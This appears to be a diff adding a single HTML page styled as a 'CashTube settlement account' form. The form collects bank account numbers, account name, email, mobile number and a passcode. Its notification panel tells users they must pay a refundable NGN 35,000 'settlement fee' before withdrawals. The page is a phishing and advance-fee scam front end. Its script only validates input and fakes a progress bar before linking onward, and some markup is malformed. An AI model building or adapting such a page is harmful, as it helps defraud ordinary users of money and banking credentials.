@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account linking</title>
+    <style>
+        :root {
+            --primary-color: #FFC0CB;
+            --secondary-color: #34a853;
+            --error-color: #ea4335;
+            --text-color: #202124;
+            --background-start: #4285f4;
+            --background-end: #34a853;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            background: linear-gradient(-45deg, var(--background-start), var(--background-end), #4285f4, #fbbc05);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+        }
+
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 0.5s ease-out forwards;
+            position: relative;
+        }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            display: block;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+        }
+
+        h2 {
+            color: var(--primary-color);
+            text-align: center;
+            margin-bottom: 30px;
+            font-weight: 500;
+            animation: slideDown 0.5s ease-out;
+        }
+
+        @keyframes slideDown {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+            animation: fadeInUp 0.5s ease-out forwards;
+            opacity: 0;
+        }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-group:nth-child(1) { animation-delay: 0.1s; }
+        .form-group:nth-child(2) { animation-delay: 0.2s; }
+        .form-group:nth-child(3) { animation-delay: 0.3s; }
+        .form-group:nth-child(4) { animation-delay: 0.4s; }
+        .form-group:nth-child(5) { animation-delay: 0.5s; }
+        .form-group:nth-child(6) { animation-delay: 0.6s; }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: var(--text-color);
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+
+        .input-icon {
+            position: absolute;
+            top: 38px;
+            right: 12px;
+            color: #5f6368;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+            animation: pulseButton 2s infinite;
+        }
+
+        @keyframes pulseButton {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        button:hover {
+            background-color: #FFC0CB;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        .error {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 5px;
+            display: flex;
+            align-items: center;
+        }
+
+        .error-icon {
+            margin-right: 5px;
+        }
+
+        .success-message {
+            text-align: center;
+            color: var(--secondary-color);
+            font-size: 18px;
+            margin-top: 20px;
+            opacity: 0;
+            transform: scale(0.8);
+            transition: all 0.5s ease;
+        }
+
+        .success-message.show {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background-color: #e0e0e0;
+            margin-top: 20px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress {
+            width: 0;
+            height: 100%;
+            background-color: var(--secondary-color);
+            transition: width 0.5s ease;
+        }
+
+        .password-toggle {
+            position: absolute;
+            top: 38px;
+            right: 12px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .strength-meter {
+            background-color: #e0e0e0;
+            height: 4px;
+            width: 100%;
+            margin-top: 5px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .strength-meter-fill {
+            height: 100%;
+            width: 0;
+            transition: width 0.3s ease, background-color 0.3s ease;
+        }
+
+        .notification-toggle {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 24px;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        .notification-panel {
+            position: absolute;
+            top: 40px;
+            right: 10px;
+            background-color: white;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 10px;
+            width: 250px;
+            display: none;
+            z-index: 5;
+        }
+
+        .notification-panel.show {
+            display: block;
+        }
+
+        .notification-item {
+            padding: 10px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .notification-item:last-child {
+            border-bottom: none;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 20px;
+            }
+
+            .notification-panel {
+                width: calc(100% - 20px);
+                right: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="notification-toggle" id="notificationToggle">🔔</div>
+        <div class="notification-panel" id="notificationPanel">
+            <div class="notification-item">Read carefully!</div>
+            <div class="notification-item">“Dear user, thank you for choosing CashTube. Please be advised that the settlement account you provide will serve as the account where your withdrawal funds will be deposited. To proceed, a one-time settlement fee of NGN 35,000.00 is required to authorize your account to accept withdrawals. This fee is a standard security measure to ensure that the funds are directed to a verified account. Once the authorization process is complete, the settlement fee of NGN 35,000.00 will be credited back into your account along with the withdrawal amount, so no charges will be deducted in the end. Please ensure that the account details you provide are accurate to avoid any delays in processing. We appreciate your understanding and cooperation.”</div>
+        </div>
+        <img src="https://play-lh.googleusercontent.com/PihSceOlrNHFBTY3_bZyYGAJTzkjbV0U6FM99w4WldsWJFa5DIMWV7iMMEFpqEUm1Fg=w240-h480-rw" alt="Bank Logo" class="logo">
+        <h2>CashTube settlement account</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="accountNumber">Account Number</label>
+                <input type="Number" id="accountNumber" name="accountNumber" required>
+                <span class="input-icon">&#128179;</span>
+                <span class="error" id="accountNumberError"></span>
+            </div>
+            <div class="form-group">
+                <label for="accountName">Account Name</label>
+                <input type="text" id="accountName" name="accountName" required>
+                <span class="input-icon">&#128100;</span>
+                <span class="error" id="accountNameError"></span>
+            </div>
+            <div class="form-group">
+                <label for="recipientAccount">Recipient Account</label>
+                <input type="Number" id="recipientAccount" name="recipientAccount" required>
+                <span class="input-icon">&#128101;</span>
+                <span class="error" id="recipientAccountError"></span>
+            </div>
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required>
+                <span class="input-icon">&#9993;</span>
+                <span class="error" id="emailError"></span>
+            </div>
+            <div class="form-group">
+                <label for="mobileNumber">Mobile Number</label>
+                <input type="Number" id="mobileNumber" name="mobileNumber" required>
+                <span class="input-icon">&#128241;</span>
+                <span class="error" id="mobileNumberError"></span>
+            </div>
+            <div class="form-group">
+                <label for="passcode">Passcode</label>
+                <input type="password" id="passcode" name="passcode" required>
+                <span class="password-toggle" id="passwordToggle">&#128065;</span>
+                <span class="error" id="passcodeError"></span>
+                <div class="strength-meter">
+                    <div class="strength-meter-fill" id="strengthMeter"></div>
+                </div>
+            </div>
+            <button type="submit">Continue</button>
+        </form>
+        <div class="success-message" id="successMessage">
+            <a href="oneload.html">
+            <button type="submit"> Proceed
+            </div>
+        <div class="progress-bar">
+            <div class="progress" id="progressBar"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('loginForm');
+            const successMessage = document.getElementById('successMessage');
+            const progressBar = document.getElementById('progressBar');
+            const passwordToggle = document.getElementById('passwordToggle');
+            const passcodeInput = document.getElementById('passcode');
+            const strengthMeter = document.getElementById('strengthMeter');
+            const notificationToggle = document.getElementById('notificationToggle');
+            const notificationPanel = document.getElementById('notificationPanel');
+
+            notificationToggle.addEventListener('click', function() {
+                notificationPanel.classList.toggle('show');
+            });
+
+            document.addEventListener('click', function(event) {
+                if (!notificationPanel.contains(event.target) && event.target !== notificationToggle) {
+                    notificationPanel.classList.remove('show');
+                }
+            });
+
+            passwordToggle.addEventListener('click', function() {
+                const type = passcodeInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passcodeInput.setAttribute('type', type);
+                this.textContent = type === 'password' ? '👁' : '🔒';
+            });
+
+            passcodeInput.addEventListener('input', updateStrengthMeter);
+
+            function updateStrengthMeter() {
+                const password = passcodeInput.value;
+                let strength = 0;
+                if (password.length > 6) strength += 20;
+                if (password.match(/[a-z]+/)) strength += 20;
+                if (password.match(/[A-Z]+/)) strength += 20;
+                if (password.match(/[0-9]+/)) strength += 20;
+                if (password.match(/[$@#&!]+/)) strength += 20;
+
+                strengthMeter.style.width = strength + '%';
+                if (strength < 40) {
+                    strengthMeter.style.backgroundColor = '#ff4d4d';
+                } else if (strength < 70) {
+                    strengthMeter.style.backgroundColor = '#ffd700';
+                } else {
+                    strengthMeter.style.backgroundColor = '#5cff5c';
+                }
+            }
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                if (validateForm()) {
+                    simulateLogin();
+                }
+            });
+
+            function simulateLogin() {
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 10;
+                    progressBar.style.width = progress + '%';
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        form.style.display = 'none';
+                        successMessage.classList.add('show');
+                    }
+                }, 200);
+            }
+
+            function validateForm() {
+                let isValid = true;
+                const fields = ['accountNumber', 'accountName', 'recipientAccount', 'email', 'mobileNumber', 'passcode'];
+                
+                fields.forEach(field => {
+                    const input = document.getElementById(field);
+                    const error = document.getElementById(field + 'Error');
+                    let errorMessage = '';
+
+                    switch(field) {
+                        case 'accountNumber':
+                        case 'recipientAccount':
+                            if (!/^\d{10}$/.test(input.value)) {
+                                errorMessage = 'Must be 10 digits';
+                            }
+                            break;
+                        case 'accountName':
+                            if (input.value.trim() === '') {
+                                errorMessage = 'Account Name is required';
+                            }
+                            break;
+                        case 'email':
+                            if (!/\S+@\S+\.\S+/.test(input.value)) {
+                                errorMessage = 'Invalid email format';
+                            }
+                            break;
+                        case 'mobileNumber':
+                            if (!/^\d{11}$/.test(input.value)) {
+                                errorMessage = 'Must be 11 digits';
+                            }
+                            break;
+                        case 'passcode':
+                            if (input.value.length < 5) {
+                                errorMessage = 'Must be at least 5 characters';
+                            }
+                            break;
+                    }
+
+                    if (errorMessage) {
+                        showError(input, errorMessage);
+                        isValid = false;
+                    } else {
+                        clearError(input);
+                    }
+                });
+
+                return isValid;
+            }
+
+            function showError(input, message) {
+                const errorElement = document.getElementById(input.id + 'Error');
+                errorElement.innerHTML = `<span class="error-icon">&#9888;</span> ${message}`;
+                input.classList.add('error-input');
+            }
+
+            function clearError(input) {
+                const errorElement = document.getElementById(input.id + 'Error');
+                errorElement.textContent = '';
+                input.classList.remove('error-input');
+            }
+
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.style.transform = 'translateY(-2px)';
+                    this.style.boxShadow = '0 4px 6px rgba(32,33,36,0.28)';
+                });
+                input.addEventListener('blur', function() {
+                    this.style.transform = 'translateY(0)';
+                    this.style.boxShadow = 'none';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
